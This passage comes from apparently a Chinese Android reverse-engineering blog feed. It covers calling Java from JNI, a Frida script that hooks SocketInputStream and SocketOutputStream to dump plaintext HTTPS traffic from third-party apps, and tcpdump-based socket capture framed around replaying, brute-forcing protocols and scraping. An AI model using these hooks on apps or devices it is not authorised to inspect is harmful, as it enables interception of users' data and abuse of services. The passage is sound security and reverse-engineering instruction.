<p>PS：新版的布局函数调用出错了，换了老版的布局函数。以后再解决</p>
<pre><code class="c++">binding = ActivityMainBinding.inflate(getLayoutInflater());
setContentView(binding.getRoot());
</code></pre>
<p>换了老版的</p>
<pre><code class="c++">setContentView(R.layout.activity_main);

TextView tv = findViewById(R.id.sample_text);
</code></pre>
</blockquote>
<pre><code class="C++">extern "C"
JNIEXPORT void JNICALL
Java_com_xiaoeryu_reflectiontest_MainActivity_onCreate(JNIEnv *env, jobject thiz,
                                                       jobject saved_instance_state) {
//        super.onCreate(savedInstanceState);

    // TODO: implement onCreate()
    // 有三种方法都可以获取到当前类引用
    jclass AppCompatActivity_jclass = env-&gt;FindClass("androidx/appcompat/app/AppCompatActivity");
    jclass MainActivity_jclass1 = env-&gt;FindClass("com/xiaoeryu/reflectiontest/MainActivity");
    jclass MainActivity_jclass2 = env-&gt;GetObjectClass(thiz);
    // 获取父类
    jclass AppCompatActivity_jclass2 = env-&gt;GetSuperclass(MainActivity_jclass2);
    // protected native void onCreate(Bundle savedInstanceState);
    // super.onCreate(savedInstanceState);
    jmethodID onCreate_mid = env-&gt;GetMethodID(AppCompatActivity_jclass, "onCreate", "(Landroid/os/Bundle;)V");
//    void CallNonvirtualVoidMethod(jobject obj, jclass clazz,
//                                  jmethodID methodID, ...)
    // 当前类对象是MainActivity类对象
    env-&gt;CallNonvirtualVoidMethod(thiz, AppCompatActivity_jclass, onCreate_mid,saved_instance_state);

    // 然后就可以调用Java中的方法了
    jstring arg1 = env-&gt;NewStringUTF("xiaoeryu");
    jstring arg2 = env-&gt;NewStringUTF("onCreate is Called!");
    // 使用Log也需要先找到它所在的类名创建类引用
    jclass LogJclass = env-&gt;FindClass("android/util/Log");
    // .i是一个静态函数可以在JNI中直接调用，所以就直接获取MethodID
    // public static int i(String tag, String msg)
    jmethodID Log_i_mid = env-&gt;GetStaticMethodID(LogJclass, "i", "(Ljava/lang/String;Ljava/lang/String;)I");

    jint result = env-&gt;CallStaticIntMethod(LogJclass, Log_i_mid, arg1, arg2);

    __android_log_print(4, "xiaoeryu-&gt;jni", "Log_i_mid-&gt;%d", result);

/* setContentView(R.layout.activity_main);
 * TextView tv = findViewById(R.id.sample_text);
 * Test testobj = (Test) callInit();
 * Log.i("xiaoeryu", testobj.flag);
*/
    jmethodID setContentView_mid = env-&gt;GetMethodID(MainActivity_jclass2, "setContentView", "(I)V");

    jclass R_layoutjclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/R$layout");
    jfieldID activity_main_fieldid = env-&gt;GetStaticFieldID(R_layoutjclass, "activity_main", "I");
    jint activity_main_value = env-&gt;GetStaticIntField(R_layoutjclass, activity_main_fieldid);

    env-&gt;CallVoidMethod(thiz, setContentView_mid, activity_main_value);

//    TextView tv = findViewById(R.id.sample_text);
    jmethodID findViewById_mid = env-&gt;GetMethodID(MainActivity_jclass2, "findViewById", "(I)Landroid/view/View;");

    jclass R_idjclass = env-&gt;FindClass("com/xiaoeryu/reflectiontest/R$id");
    jfieldID sample_text_fieldid = env-&gt;GetStaticFieldID(R_idjclass, "sample_text", "I");
    jint sample_text_value = env-&gt;GetStaticIntField(R_idjclass, sample_text_fieldid);

    env-&gt;CallObjectMethod(thiz, findViewById_mid, sample_text_value);

    /*
     * Test testobj = (Test) callInit();
     * Log.i("xiaoeryu", testobj.flag);
     * */
    jmethodID callInit_mid = env-&gt;GetMethodID(MainActivity_jclass2, "callInit", "()Ljava/lang/Object;");
    jobject testobj = env-&gt;CallObjectMethod(thiz,callInit_mid);

    jclass testjcalss = env-&gt;FindClass("com/xiaoeryu/reflectiontest/Test");
    jfieldID flagjfield = env-&gt;GetFieldID(testjcalss, "flag", "Ljava/lang/String;");
    jstring flagvalue = static_cast&lt;jstring&gt;(env-&gt;GetObjectField(testobj, flagjfield));

    jint result_flag = env-&gt;CallStaticIntMethod(LogJclass, Log_i_mid, arg1, flagvalue);

    __android_log_print(4, "xiaoeryu-&gt;jni", "flag-&gt;%d", result_flag);
}
</code></pre>
<blockquote>
<p>通过对<code>Oncreate</code>以及它里面调用的实现可以发现，任意一个Java实现的函数都可以换成JNI来实现</p>
<img src="/2023/10/14/JNI%E8%AE%BF%E9%97%AEJava%E7%B1%BB%E5%87%BD%E6%95%B0/image-20231019111854757.png" class="" title="image-20231019111854757">
</blockquote>
<p><a href="https://github.com/xiaoeeyu/JNIAccessJavaClassFunc">代码地址</a></p>
]]></content>
      <categories>
        <category>NDK开发</category>
      </categories>
      <tags>
        <tag>JNI访问Java类函数</tag>
      </tags>
  </entry>
  <entry>
    <title>Java层SSL通信抓包与溯源</title>
    <url>/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/</url>
    <content><![CDATA[<p>http/https都是建立在tcp/udp之上应用层的协议，SSL/TLS又是HTTPS工作的一个基础，所以对socket进行字段溯源的时候绕不开的一个就是HTTPS协议。但是HTTPS是加密的，另外它中间还有证书验证，所以通过抓包工具无法直接抓到数据包。</p>
<p>在这篇文章中我们先尝试通过源码分析HTTPS的加密流程，获取hook点。通过FridaHook的方式抓到数据包。</p>
<span id="more"></span>

<p>这里同样写一个使用okhttp去访问<strong><a href="https://www.baidu.com/">https://www.baidu.com</a></strong>的<a href="https://github.com/xiaoeeyu/OkhttpsDemo">Demo App</a></p>
<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240605161625342.png" class="" title="image-20240605161625342">

<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240605160219365.png" class="" title="image-20240605160219365">

<p>环境：</p>
<blockquote>
<p>环境跟前两篇文章用的不同，因为pixel XL的手机电池鼓包game over了，可能电脑连接的USB接口上电流不稳定+时间长没拔发热严重的原因。换了一台pixel 5来测试，虚拟机换了kali，因为安装的在Ubuntu上安装了新版Charles界面显示有点问题，还是新版kali更好看点</p>
<p>Android版本：11.0</p>
<p>虚拟机：kali 2023.4</p>
</blockquote>
<h3 id="那环境配置不再啰嗦，直接开始调试吧"><a href="#那环境配置不再啰嗦，直接开始调试吧" class="headerlink" title="那环境配置不再啰嗦，直接开始调试吧"></a>那环境配置不再啰嗦，直接开始调试吧</h3><img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606020010121.png" class="" title="image-20240606020010121">

<p>因为这里都是多线程，所以没法一步一步的单步调试，只能下断点F9执行然后往断点上撞了：因为HTTP/HTTPS无论如何都是要经过socket执行的所以我们这里在<code>connectSocket</code>都下了断点</p>
<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606034621189.png" class="" title="image-20240606034621189">

<p>分析这段代码可知</p>
<blockquote>
<pre><code class="java"> try {
   Platform.get().connectSocket(rawSocket, route.socketAddress(), connectTimeout);
 } catch (ConnectException e) {
   throw new ConnectException("Failed to connect to " + route.socketAddress());
 }
</code></pre>
<ul>
<li>使用前面创建的套接字来尝试连接目标地址</li>
</ul>
<p>创建缓冲的输入和输出流，方便后续的读写操作</p>
<pre><code class="java">source = Okio.buffer(Okio.source(rawSocket));	// 创建一个带缓冲的输入流
sink = Okio.buffer(Okio.sink(rawSocket));		// 创建一个带缓冲的输出流
</code></pre>
<ul>
<li>使用<strong>Okio</strong>库为套接字创建输入和输出流缓冲区，我们抓包的目的就是通过hook拿到输入（接收数据）和输出（发送数据），跟进Okio.java分析</li>
</ul>
</blockquote>
<h4 id="分析Okio-java中对输出流缓冲区的操作"><a href="#分析Okio-java中对输出流缓冲区的操作" class="headerlink" title="分析Okio.java中对输出流缓冲区的操作"></a>分析<code>Okio.java</code>中对输出流缓冲区的操作</h4><img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606041858434.png" class="" title="image-20240606041858434">

<ul>
<li>这里进行了一些检查判断数据是否为空，不为空就调用<code>write</code>方法循环将数据从buffer写到<code>OutputStream</code>中</li>
<li>之后调用<code>OutputStream</code>的<code>flush</code>方法，确保所有数据都已写入底层流</li>
<li>所以我们等下直接去Android 11的源码中去找<code>java.net.SocketinputStream-&gt;write()</code>看怎么hook能获取到输出流</li>
</ul>
<h4 id="分析Okio-java中对输入流缓冲区的操作"><a href="#分析Okio-java中对输入流缓冲区的操作" class="headerlink" title="分析Okio.java中对输入流缓冲区的操作"></a>分析<code>Okio.java</code>中对输入流缓冲区的操作</h4><img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606043108451.png" class="" title="image-20240606043108451">

<ul>
<li>这里同样的使用<code>read</code>方法从<code>InputStream</code>读取数据</li>
<li>同样去Android源码中找<code>java.net.SocketinputStream-&gt;read()</code></li>
</ul>
<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>不确定在哪个模块中，直接在Android11的源码中全局搜索</p>
<h5 id="java-net-SocketinputStream-gt-write"><a href="#java-net-SocketinputStream-gt-write" class="headerlink" title="java.net.SocketinputStream->write()"></a>java.net.SocketinputStream-&gt;write()</h5><img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606044534425.png" class="" title="image-20240606044534425">

<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606044754605.png" class="" title="image-20240606044754605">

<ul>
<li>进来之后直接找到了它最终调用的JNI函数<code>socketWrite0()</code>等下直接hook这个函数</li>
</ul>
<h5 id="java-net-SocketinputStream-gt-read"><a href="#java-net-SocketinputStream-gt-read" class="headerlink" title="java.net.SocketinputStream->read()"></a>java.net.SocketinputStream-&gt;read()</h5><p>基本跟刚刚是一样的流程（代码太长了不好截图，直接贴了下来）</p>
<pre><code class="java">97      private native int socketRead0(FileDescriptor fd,
98                                     byte b[], int off, int len,
99                                     int timeout)
100          throws IOException;
101  
    
。。。。。。
    
115      private int socketRead(FileDescriptor fd,
116                             byte b[], int off, int len,
117                             int timeout)
118          throws IOException {
119          return socketRead0(fd, b, off, len, timeout);
120      }

。。。。。。
    
147      int read(byte b[], int off, int length, int timeout) throws IOException {
148          int n;
149  
150          // EOF already encountered
151          if (eof) {
152              return -1;
153          }
154  
155          // connection reset
156          if (impl.isConnectionReset()) {
157              throw new SocketException("Connection reset");
158          }
159  
160          // bounds check
161          if (length &lt;= 0 || off &lt; 0 || length &gt; b.length - off) {
162              if (length == 0) {
163                  return 0;
164              }
165              throw new ArrayIndexOutOfBoundsException("length == " + length
166                      + " off == " + off + " buffer length == " + b.length);
167          }
168  
169          boolean gotReset = false;
170  
171          // acquire file descriptor and do the read
172          FileDescriptor fd = impl.acquireFD();
173          try {
174              // Android-added: Check BlockGuard policy in read().
175              BlockGuard.getThreadPolicy().onNetwork();
176              n = socketRead(fd, b, off, length, timeout);	// 标记
177              if (n &gt; 0) {
178                  return n;
179              }
180          } catch (ConnectionResetException rstExc) {
181              gotReset = true;
182          } finally {
183              impl.releaseFD();
184          }
185  
186          /*
187           * We receive a "connection reset" but there may be bytes still
188           * buffered on the socket
189           */
190          if (gotReset) {
191              impl.setConnectionResetPending();
192              impl.acquireFD();
193              try {
194                  n = socketRead(fd, b, off, length, timeout);	// 标记
195                  if (n &gt; 0) {
196                      return n;
197                  }
198              } catch (ConnectionResetException rstExc) {
199              } finally {
200                  impl.releaseFD();
201              }
202          }
203  
204          /*
205           * If we get here we are at EOF, the socket has been closed,
206           * or the connection has been reset.
207           */
208          if (impl.isClosedOrPending()) {
209              throw new SocketException("Socket closed");
210          }
211          if (impl.isConnectionResetPending()) {
212              impl.setConnectionReset();
213          }
214          if (impl.isConnectionReset()) {
215              throw new SocketException("Connection reset");
216          }
217          eof = true;
218          return -1;
219      }
</code></pre>
<h3 id="FridaHook"><a href="#FridaHook" class="headerlink" title="FridaHook"></a>FridaHook</h3><h4 id="hook点"><a href="#hook点" class="headerlink" title="hook点"></a>hook点</h4><pre><code class="js">// 发送数据
//  java.net.SocketinputStream-&gt;socketRead0()
private native int socketRead0(FileDescriptor fd,
                               byte b[], int off, int len,
                               int timeout)
// 接收数据
// java.net.SocketinputStream-&gt;socketRead0()
private native void socketWrite0(FileDescriptor fd, byte[] b, int off,
                                 int len) throws IOException;
</code></pre>
<ul>
<li>最后发现这两个hook点跟我们之前Java层socket的TCP hook点是一样的</li>
</ul>
<h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><p>直接使用原来的脚本稍微修改一下就ok了</p>
<pre><code class="js">function LogPrint(log) {
    var theDate = new Date();
    var hour = theDate.getHours();
    var minute = theDate.getMinutes();
    var second = theDate.getSeconds();
    var mSecond = theDate.getMilliseconds();

    hour &lt; 10 ? hour = "0" + hour : hour;
    minute &lt; 10 ? minute = "0" + minute : minute;
    second &lt; 10 ? second = "0" + second : second;
    mSecond &lt; 10 ? mSecond = "00" + mSecond : mSecond &lt; 100 ? mSecond = "0" + mSecond : mSecond;
    var time = hour + ":" + minute + ":" + second + ":" + mSecond;
    var threadid = Process.getCurrentThreadId();
    console.log("[" + time + "]" + "-&gt;threadid:" + threadid + "--" + log);

}
function printJavaStack(name) {
    Java.perform(function () {
        var Exception = Java.use("java.lang.Exception");
        var ins = Exception.$new("Exception");
        var straces = ins.getStackTrace();
        if (straces != undefined &amp;&amp; straces != null) {
            var strace = straces.toString();
            var replaceStr = strace.replace(/,/g, " \n ");
            LogPrint("=============================" + name + " Stack strat=======================");
            LogPrint(replaceStr);
            LogPrint("=============================" + name + " Stack end======================= \n ");
            Exception.$dispose();
        }
    });
}

// 对可打印字符区间进行一个判断只打印可打印字符
function isprintable(value) {
    if (value &gt;= 32 &amp;&amp; value &lt;= 126) {
        return true
    }
    return false
}

function hookssl() {
    Java.perform(function () {

        var SocketInputStreamClass = Java.use('java.net.SocketInputStream')
        // hook socketRead0()
        SocketInputStreamClass.socketRead0.implementation = function (arg0, arg1, arg2, arg3, arg4) {
            var size = this.socketRead0(arg0, arg1, arg2, arg3, arg4)
            console.log("[" + Process.getCurrentThreadId() + "]socketRead0 &gt; size: " + size + ",content: " + JSON.stringify(arg1))
            var byteArray = Java.array("byte", arg1)
            var content = '';
            for (var i = 0; i &lt; size; i++) {
                if (isprintable(byteArray[i])) {
                    content = content + String.fromCharCode(byteArray[i])
                }
            }
            var socketimpl = this.impl.value
            var address = socketimpl.address.value
            var port = socketimpl.port.value

            console.log("\naddress:" + address + ",port: " + port + "\n" + JSON.stringify(this.socket.value) + "\n[" + Process.getCurrentThreadId() + "]receive:" + content);

            printJavaStack('socketRead0()...')
            return size;
        }


        var SocketOutputStreamClass = Java.use('java.net.SocketOutputStream')
        // hook socketWrite0()
        SocketOutputStreamClass.socketWrite0.implementation = function (arg0, arg1, arg2, arg3) {
            var result = this.socketWrite0(arg0, arg1, arg2, arg3)
            console.log("[" + Process.getCurrentThreadId() + "]socketWrite0 &gt; result: " + arg3 + "--content: " + JSON.stringify(arg1))
            var byteArray = Java.array("byte", arg1)
            var content = '';
            for (var i = 0; i &lt; arg3; i++) {
                if (isprintable(byteArray[i])) {
                    content = content + String.fromCharCode(byteArray[i])
                }
            }

            var socketimpl = this.impl.value
            var address = socketimpl.address.value
            var port = socketimpl.port.value

            // console.log("[" + Process.getCurrentThreadId() + "]send: " + content)
            console.log("send address:" + address + ",port: " + port + "[" + Process.getCurrentThreadId() + "]send:" + content);
            console.log("\n" + JSON.stringify(this.socket.value));
            printJavaStack('socketWrite0()...')
            return result;
        }
    })
}

function main() {
    hookssl()
}

setImmediate(main)
</code></pre>
<h4 id="执行hook"><a href="#执行hook" class="headerlink" title="执行hook"></a>执行hook</h4><p><code>frida -UF -l hookSSL.js -o OkhttpDemo.log</code></p>
<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606052048409.png" class="" title="image-20240606052048409">

<ul>
<li>这里成功的抓到了数据包，也把调用的堆栈打印了出来</li>
</ul>
<h4 id="对其他App进行抓包"><a href="#对其他App进行抓包" class="headerlink" title="对其他App进行抓包"></a>对其他App进行抓包</h4><p>滴答清单</p>
<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606220920769.png" class="" title="image-20240606220920769">

<p>Frida也支持对多进程App进行抓包：UC浏览器</p>
<img src="/2024/06/06/Java%E5%B1%82SSL%E9%80%9A%E4%BF%A1%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%AF%E6%BA%90/image-20240606220944827.png" class="" title="image-20240606220944827">

<p><code>frida -U -p 进程编号 -l hookSSL.js</code></p>
<h4 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h4><p>分析后对照源码发现8.0的SSL流程和8.0以后的SSL流程完全不一样，8.0最后的JNI函数分别是</p>
<pre><code>com.android.org.conscrypt.NativeCrypto.SSL_read
com.android.org.conscrypt.NativeCrypto.SSL_write
</code></pre>
<h4 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h4><p><a href="https://github.com/xiaoeeyu/hookSSL8.0">8.0的hook代码</a></p>
<p><a href="https://github.com/xiaoeeyu/hookSSL11.0/tree/main">11.0的hook代码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>Java层socket抓包与源码分析（上）</title>
    <url>/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    <content><![CDATA[<p>tcp/udp协议以及一些字段的溯源，快速定位一些字段（例如用户名和密码）是怎么加密的，分析出来之后怎么去进行枚举、重放。</p>
<p>典型的应用就是怎么去编写爬虫去爬去例如商城的商品等</p>
<hr>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>接下来几篇文章我们需要解决的问题</p>
<blockquote>
<p>如何对自定义协议进行逆向分析？</p>
<p>发送参数被加密，如何快速完成参数处理流程的定位？</p>
<p>加密算法复杂，如何主动调用完成对数据包的处理和重放？</p>
</blockquote>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>通过分析需要达到的目的</p>
<blockquote>
<p>掌握阅读和分析Android系统框架层网络数据包接收发送的源码逻辑</p>
<p>掌握快速进行字段追踪溯源的技巧</p>
<p>掌握基于frida、xposed、AndroidNativeEmu、Unidbg等的主动调用技巧，从而完成对协议的枚举和爆破、甚至是数据的爬取</p>
</blockquote>
<h2 id="逆向分析思想"><a href="#逆向分析思想" class="headerlink" title="逆向分析思想"></a>逆向分析思想</h2><p>堆栈回溯思想</p>
<blockquote>
<p>逐层向上追溯、对参数的处理，关键函数和参数处理放在so中。所以分别在Java和JNI中怎么处理</p>
</blockquote>
<p>控制流分析与数据流分析相结合思想</p>
<blockquote>
<p>参数处理流程、关键API</p>
</blockquote>
<p>关键字符串、关键API定位思想</p>
<blockquote>
<p>对这些关键点要格外注意跟Windows分析一样</p>
</blockquote>
<hr>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240527165013099.png" class="" title="image-20240527165013099">

<ul>
<li>socket协议就在传输层</li>
<li>再上层的就是tcp、udp等协议在应用层</li>
</ul>
<p>有些App不会自己去调用socket来完成网络请求，因为麻烦。</p>
<p>通过hook** java.net.Socket**背后所封装的关键API，获取信息</p>
<hr>
<h2 id="创建demo来作为分析案例"><a href="#创建demo来作为分析案例" class="headerlink" title="创建demo来作为分析案例"></a>创建demo来作为分析案例</h2><p>这里写一个简单的客户端和服务端的收发数据的demo</p>
<blockquote>
<p>服务端：<a href="https://github.com/xiaoeeyu/TcpServer-Demo">python接收器</a></p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531123232991.png" class="" title="image-20240531123232991">

<p>客户端：<a href="https://github.com/xiaoeeyu/okhttp2.6">App Demo</a></p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531123256577.png" class="" title="image-20240531123256577">
</blockquote>
<p>要使用的工具安装</p>
<blockquote>
<p>安装tcpdump：等下用来抓包测试通信是否畅通</p>
<ul>
<li>下载<a href="https://www.androidtcpdump.com/download/4.99.4.1.10.4/tcpdump">tcpdump包</a>，将其拷贝到手机<code>adb push tcpdump /data/local/tmp/</code></li>
<li>设置执行权限<code>chmod 755 tcpdump</code></li>
<li>添加到环境变量<code>export PATH=$PATH:/data/local/tmp</code></li>
</ul>
<p>安装wire shark：Ubuntu自身没有带，如果是kali的话自带的就有</p>
<pre><code># 更新软件包列表
sudo apt update

# 安装Wireshark
sudo apt install wireshark-qt

# 在安装过程中选择允许非超级用户捕获数据包（如果提示）

# 将当前用户添加到wireshark组
sudo usermod -aG wireshark $(whoami)
</code></pre>
</blockquote>
<p>使用tcpdump对手机上的所有通信进行抓包然后用wireshark打开分析</p>
<ul>
<li><p>tcpdump抓包</p>
<pre><code>adb shell
su
cd /data/local/tmp/
tcpdump -i any -s 0 -w /sdcard/01.pcap
</code></pre>
</li>
</ul>
<p>然后运行我们demo的客户端和服务端</p>
<p>抓完后用wireshark打开查看，确认数据收发通信正常</p>
<p>把我们抓到的数据包pull下来用wireshark查看<code>wireshark 01.pcap</code></p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531122459703.png" class="" title="image-20240531122459703">

<ul>
<li>这里我们的demo没有对数据进行加密，所以抓到的包都是明文的。现在的App一般都会对数据进行加密，不会使用这种http明文传输</li>
<li>抓包看到通信没有问题，接下来调试分析我们的代码，分析合适的hook点</li>
</ul>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>调试分析客户端的的源码来获取抓包的hook时机</p>
<p>调试的时候注意下载好对应系统的sdk，在设置&gt;androidSDK里面可以直接下载，具体的配置过程都可以搜索到不在这里啰嗦</p>
<ul>
<li>下面这段代码分析比较简单也比较啰嗦可以直接看分析结果</li>
</ul>
<h5 id="构造socket"><a href="#构造socket" class="headerlink" title="构造socket"></a>构造socket</h5><p>从socket构造开始调试我们的客户端代码</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531152406588.png" class="" title="image-20240531152406588">

<ul>
<li>按F7步入</li>
</ul>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531164140370.png" class="" title="image-20240531164140370">

<p>创建套接字，建立连接</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531164319343.png" class="" title="image-20240531164319343">

<ul>
<li><p>socket有很多重载，这里使用的是这四个参数的重载</p>
</li>
<li><p>在for循环中使用工厂模式创建套接字实例<code>setImpl()</code></p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531182636108.png" class="" title="image-20240531182636108">

<ul>
<li>impl -&gt; java.net.SocksSocketImpl</li>
</ul>
</li>
<li><p>使用connect建立连接使用的方法</p>
<p>connect(SocketAddress endpoint)</p>
</li>
</ul>
<h5 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h5><p>清除其它断点直接断在接收数据处，看看接收数据使用的方法</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531185409687.png" class="" title="image-20240531185409687">

<ul>
<li>java.net.SocketInputStream.read（byte[]）</li>
</ul>
<h5 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h5><p>同样直接断下载看发送数据使用的方法</p>
<img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531185801277.png" class="" title="image-20240531185801277">

<ul>
<li>java.net.SocketOutputStream.write(byte[])</li>
</ul>
<h5 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h5><p>经过分析我们拿到了下面这些hook点</p>
<blockquote>
<p>java.net.Socket类构造函数：new Socket(ip, port);</p>
<p>​	private Socket(InetAddress[] addresses, int port, SocketAddress localAddr,boolean stream)</p>
<p>​		创建套接字：impl -&gt; java.net.SocksSocketImpl</p>
<p>建立连接：connect(SocketAddress endpoint)</p>
<p>接收数据：java.net.SocketInputStream.read(byte[])</p>
<p>发送数据：java.net.SocketOutputStream.write(byte[])</p>
</blockquote>
<h2 id="Android源码分析"><a href="#Android源码分析" class="headerlink" title="Android源码分析"></a>Android<a href="http://androidxref.com/8.1.0_r33/">源码</a>分析</h2><p>接下来分析Android源码，获取我们方才分析拿到的方法，在框架背后的实现</p>
<p>暂时我们的源码分析先到java层结束为止，不进入native层分析。后面如果碰到不使用Java层的API，直接调用libc中的API进行通信的再继续往下分析，当然还有更进一步的跳过libc中的API，直接使用系统调用的情况，如果遇到再进行单独分析</p>
<h5 id="接收数据：java-net-SocketInputStream-read-byte"><a href="#接收数据：java-net-SocketInputStream-read-byte" class="headerlink" title="接收数据：java.net.SocketInputStream.read(byte[])"></a>接收数据：java.net.SocketInputStream.read(byte[])</h5><img src="/2024/06/01/Java%E5%B1%82socket%E6%8A%93%E5%8C%85%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20240531233558633.png" class="" title="image-20240531233558633">

<pre><code class="java">    public int read(byte b[]) throws IOException {
        return read(b, 0, b.length);
    }
-&gt;这里的回调指向了下面有三个参数的read函数
    
     public int read(byte b[], int off, int length) throws IOException {
        return read(b, off, length, impl.getTimeout());
    }   
-&gt;这里的回调指向了下面有四个参数的read函数
    
        int read(byte b[], int off, int length, int timeout) throws IOException {
        int n;

        // EOF already encountered
        if (eof) {
            return -1;
        }

        // connection reset
        if (impl.isConnectionReset()) {
            throw new SocketException("Connection reset");
        }

        // bounds check
        if (length &lt;= 0 || off &lt; 0 || length &gt; b.length - off) {
            if (length == 0) {
                return 0;
            }
            throw new ArrayIndexOutOfBoundsException("length == " + length
                    + " off == " + off + " buffer length == " + b.length);
        }

        // acquire file descriptor and do the read
        FileDescriptor fd = impl.acquireFD();
        try {
            // Android-added: Check BlockGuard policy in read().
            BlockGuard.getThreadPolicy().onNetwork();
            n = socketRead(fd, b, off, length, timeout);	// 这个函数中时机调用了socketRead()来进行读，跟进去这个函数
            if (n &gt; 0) {
                return n;
            }
        } catch (ConnectionResetException rstExc) {
            impl.setConnectionReset();
        } finally {
            impl.releaseFD();
        }

        /*
         * If we get here we are at EOF, the socket has been closed,
         * or the connection has been reset.
         */
        if (impl.isClosedOrPending()) {
            throw new SocketException("Socket closed");
        }
        if (impl.isConnectionReset()) {
            throw new SocketException("Connection reset");
        }
        eof = true;
        return -1;
    }

&gt;&gt;&gt;跟进上面的socketRead()
        private int socketRead(FileDescriptor fd,
                           byte b[], int off, int len,
                           int timeout)
        throws IOException {
        return socketRead0(fd, b, off, len, timeout);
    }
-&gt;这里的回调是socketRead0()
        private native int socketRead0(FileDescriptor fd,
                                   byte b[], int off, int len,
                                   int timeout)	// 可以看到这个socketRead0是一个JNI函数，TCP协议接收处理的框架Java层到这里就结束了
</code></pre>
<ul>
<li>接收数据的调用链</li>
</ul>
<h5 id="发送数据：java-net-SocketOutputStream-write-byte"><a href="#发送数据：java-net-SocketOutputStream-write-byte" class="headerlink" title="发送数据：java.net.SocketOutputStream.write(byte[])"></a>发送数据：java.net.SocketOutputStream.write(byte[])</h5><pre><code class="java">    public void write(byte b[]) throws IOException {
